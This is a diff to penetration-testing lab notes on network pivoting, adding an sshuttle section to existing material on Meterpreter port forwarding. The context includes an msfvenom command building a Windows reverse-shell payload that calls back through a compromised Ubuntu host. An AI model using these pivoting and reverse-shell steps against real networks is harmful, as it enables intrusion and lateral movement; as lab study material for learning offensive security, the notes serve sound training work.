@@ -3,6 +3,7 @@
 - Local port forwarding allows accessing services on a remote host as if they were running locally, enabling exploitation of services that would otherwise be unreachable from the attack machine.
 - Port forwarding can also be accomplished using Meterpreter's `portfwd` module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
 - Similar to local port forwards, Metasploit can also perform `reverse port forwarding` with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port `1234` to our listener on port `8081`.
+- [Sshuttle](https://github.com/sshuttle/sshuttle) is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. `Sshuttle` can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. shuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host.
 
 ---
 ## Local Port Forwarding
@@ -69,3 +70,10 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o bac
 ```
 , if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.
 
+## sshuttle
+
+```
+ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
+```
+
+running sshuttle specify the option `-r` to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23. 
